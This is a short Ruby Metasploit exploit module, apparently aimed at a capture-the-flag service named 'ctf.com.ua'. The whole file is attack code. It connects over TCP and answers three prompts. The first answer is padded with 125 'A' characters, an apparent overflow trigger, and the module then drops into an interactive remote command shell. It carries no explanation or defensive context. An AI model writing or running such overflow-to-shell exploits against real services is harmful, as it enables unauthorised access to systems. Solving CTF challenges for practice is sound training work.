require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'ctf.com.ua',
      'Description'    => "",
      'Author'         => [ 'hdm', 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
        ],
      'Privileged'     => true,
      'Platform'       => [ 'unix' ],
      'Arch'           => ARCH_CMD,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType'    => 'cmd_interact',
              'ConnectionType' => 'find'
            }
        },
      'Targets'        =>
        [
          [ 'Automatic', { } ],
        ],
      'DefaultTarget' => 0))

    register_options([], self.class)
  end

  def exploit
    payload = 'A' * 125
    answers = ["tomorrow#{payload}\r\n", "success\r\n", "point\r\n"]
    
    connect
    
    answers.each do |answer|
      resp = sock.get_once.to_s
      sock.put answer
      print_status "#{resp.strip} #{answer.strip}"
    end

    resp = sock.get_once.to_s
    print_status resp.strip
    
    handler

    disconnect
  end

end
